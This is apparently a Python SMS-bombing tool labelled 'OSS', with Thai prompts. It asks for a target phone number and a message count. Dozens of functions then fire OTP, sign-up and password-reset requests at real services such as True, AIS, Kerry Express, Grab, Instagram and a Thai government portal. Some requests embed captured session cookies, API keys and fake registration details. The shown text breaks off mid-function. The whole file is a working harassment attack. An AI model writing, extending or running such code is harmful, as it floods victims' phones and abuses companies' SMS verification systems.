import subprocess
import sys
import requests
import time
import os
os.system('cls' if os.name == 'nt' else 'clear')
from re import search
from secrets import token_hex
import requests,threading,os
from os import system
from time import sleep
from requests import Session
from httpx import get
from colorama import Fore
from time import sleep
from requests import get
from os import system
from httpx import Client


def green(text):
    system(""); faded = ""
    blue = 100
    for character in text:
        blue += 2
        if blue > 255:
            blue = 255
        faded += (f"\033[38;2;0;255;{blue}m{character}\033[0m")
    return faded

       # ----------------------------------------------- #


banner = r"""

                        ____    _____    _____
                       / __ \  / ___/   / ___/
                      / / / /  \__ \    \__ \ 
                     / /_/ /  ___/ /   ___/ / 
                     \____/  /____/   /____/  
                                    oliginal by loter  https://discord.gg/mVMBMJpUWV 

"""



def CNP():
    print(green(banner))
    phone = input("[+] เบอร์โทรศัพท์ : ")
    count = int(input("[+] ยิงเบอร์กี่ข้อความ : "))
    print()
    sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')

    sleep(1.5)

    header = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
    headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
    useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"

    def trueh():
        try:
            requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def aisplay():
        try:
            session = Session()
            ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"}).text
            r = session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def cnp1():
        try:
            response = requests.post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"{phone}"})                                                #-
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def cnp3():
        try:
            response = requests.post("https://api2.1112.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def cnp5():
        try:
            response = requests.post("https://api.1112delivery.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def cnp7():
        try:
            response = requests.post("https://shop.foodland.co.th/login/generation", headers={"User-Agent": useragent}, data={"phone": phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def cnp9():
        try:
            response = requests.post('https://api.sacasino9x.com/api/RegisterService/RequestOTP', headers=header, json={"Phone":phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def cnp10():
        try:
            response = requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", headers={"User-Agent": useragent}, data={"phone": phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def cnp11():
        try:
            response = requests.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def cnp13():
        try:
            response = requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"User-Agent": useragent, "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def cnp15():
        try:
            response = requests.post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", headers={"User-Agent": useragent}, data={"tel": phone,"otp_type":"register"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def cnp16():
        try:
            response = requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", headers={"User-Agent": useragent}, json={"on":{"value": phone,"country":"66"},"type":"mobile"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def cnp17():
        try:
            response = requests.post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def cnp21():
        try:
            response = requests.post("https://m.lucabet168.com/api/register-otp", headers={"User-Agent": useragent} ,json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def cnp23():
        try:
            response = requests.post(url="https://www.cpffeedonline.com/Customer/RegisterRequestOTP", data={"mobileNumber":f"{phone}"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def cnp24():
        try:
            response = requests.post(url="https://www.tgfone.com/index.php/signin/otp_chk", data={"mobile":f"0{phone}"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def cnp25():
        try:
            response = requests.post("https://api2.1112.com/api/v1/otp/create", json={"phonenumber":f"0{phone}","language":"th"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def cnp26():
        try:
            response = requests.post("https://unacademy.com/api/v3/user/user_check/", json={"phone":f"0{phone}","country_code":"TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def cnp27():
        try:
            response = requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def cnp28():
        try:
            response = requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register", json={"username": f"0{phone}","password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def cnp29():
        try:
            response = requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", data={"phone": f"0{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def cnp30():
        try:
            response = requests.post("https://www.berlnw.com/reservelogin", data={"p_myreserve": f"0{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def cnp31():
        try:
            response = requests.post("https://www.kickoff28.com/action.php?mode=PreRegister", data={"tel": f"0{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def cnp32():
        try:
            response = requests.post("https://1ufabet.com/_ajax_/request-otp", data={"request_otp[phoneNumber]": f"0{phone}", "request_otp[termAndCondition]": "1", "request_otp[_token]": "XBNcvQIzJK1pjh_2T0BBzLiDa6vSivktDN317mbw3ws"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def x1():
        try:
            response = requests.post('https://api2.1112.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers= header)
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def x2():
        try:
            response = requests.post('https://api.1112delivery.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers=header)
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def x8():
        try:
            response = requests.post('https://api2.1112.com/api/v1/otp/create', data = {'phonenumber': phone, 'language': "th"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def x9():
        try:
            response = requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def x10():
        try:
            response = requests.post('https://rapidapi.com/blaazetech/api/spam-caller-check/',json={"phonenumber":phone,"language":"th"},headers=header)
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api1():
        try:
            response = requests.post("https://m.thisshop.com/cos/send/code/notice", json={"sessionContext":{"channel":"h5","entityCode":0,"userReferenceNumber":"12w12y11r52gz259ue14rr7g7370239m","localDateTimeText":"20220115182850","ricnpMessage":"{}","serviceCode":"FLEX0001","superUserId":"sysadmin","tokenKey":"149d5c7bae10304c8aba0da2bbc59cb7","authorizationReason":"","transactionBranch":"TFT_ORG_0000","userId":"","locale":"th-TH"},"noticeType":1,"businessType":"RT0001","phoneNumber":f"66-{phone}"},headers={"content-type": "application/json; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api2():
        try:
            headers = {
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "referer": "https://www.wongnai.com/guest2?_f=signUp&guest_signup_type=phone",
            "cookie": "_gcl_au=1.1.1123274548.1637746846"
            }
            response = requests.post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",headers=headers,data=f"phoneno={phone}&retrycount=0")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass  
    def api4():
        try:
            response = requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api5():
        try:
            response = requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api6():
        try:
            response = requests.post("http://b226.com/x/code", data={f"phone":phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api7():
        try:
            response = requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api8():
        try:
            response = requests.post("https://api.mcshop.com/cognito/me/forget-password",headers={"x-store-token": "mcshop","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","x-auth-token": "O2d1ZXN0OzkyMDIzOTU7YThmNWMyZDE4YThlOTMzOGMyOGMwYWE5ODQwNTBjY2I7Ozs7","x-api-key": "ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3"},json={"username": phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api9():
        try:
            response = requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api10():
        try:
            response = requests.post("https://m.lavagame168.com/api/register-otp",headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","referer": "https://m.lavagame168.com/dashboard/login"},json={"brands_id":"5ffc0caa4d603200124e4eb1","agent_register":"5ffc0d5cdcd4f30012aec3d9","tel": phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api11():
        try:
            response = requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api12():
        try:
            response = requests.post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62"},json={"phone":"66"+phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api13():
        try:
            response = requests.post("https://www.msport1688.com/auth/otp_sender", data={"phoneNumber":phone,"token":"HFbWhpfhFIGSMVWlhcQ0JNQgAtJ3g3QT43FRpzKhsvGhoHEzo6C1sjaRh1dSxgfEt_URwOHgwabwwWKXgodXd9IBBtZShlPx9rQUNiek5tYDtfB3swTC4KUlVRX0cFWVkNElhjPXVzb3NWBSpvVzofb1ZFLi15c2YrTltsL0FpGSMVGQ9rCRsacxJcemxjajdoch8sfEhoWVlvbVEsQ0tWfhgfOGth"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api14():
        try:
            response=requests.post('https://www.msport1688.com/auth/otp_sender', headers=header, data={"phone": phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api15():
        try:
            response = requests.post("http://b226.com/x/code", data={f"phone":phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api16():
        try:
            response = requests.post("https://ep789bet.net/auth/send_otp", data={"phone":phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api18():
        try:
            response = requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api19():
        try:
            response = requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-{phone}")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api20():
        try:
            response = requests.post("https://shop.foodland.co.th/login/generation", data={"phone": phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api21():
        try:
            response = requests.post("https://jdbaa.com/api/otp-not-captcha", data={"phone_number":phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api22():
        try:
            response = requests.post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers={})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api23():
        try:
            response = requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", data={"phone": phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api24():
        try:
            response = requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api25():
        try:
            response = requests.post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api26():
        try:
            response = requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api27():
        try:
            response = requests.post("https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/"+phone)
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api28():
        try:
            response = requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api29():
        try:
            response = requests.post("https://partner-api.grab.com/grabid/v1/oauth2/otp", json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": phone},headers={})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api30():
        try:
            response = requests.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", data={"phone": phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api31():
        try:
            response = requests.post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": phone,"password":"123456789Az"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api32():
        try:
            response = requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})
            response = requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api33():
        try:
            head = {
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "referer": "https://laopun.com/register",
            "cookie": "PHPSESSID=q32n008kgetm0tilch7f5qv2qp;_ga=GA1.1.677079826.1639848607;_ga_70EKP2Z28V=GS1.1.1639848607.1.1.1639848745.0"
            }
            response = requests.get(f"https://laopun.com/send-sms?id={phone}&otp=5153",headers=head)
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api34():
        try:
            response = requests.post("https://jdbaa.com/api/otp-not-captcha", data={"phone_number":phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api35():
        try:
            head = {
            "content-type": "application/json;charset=UTF-8",
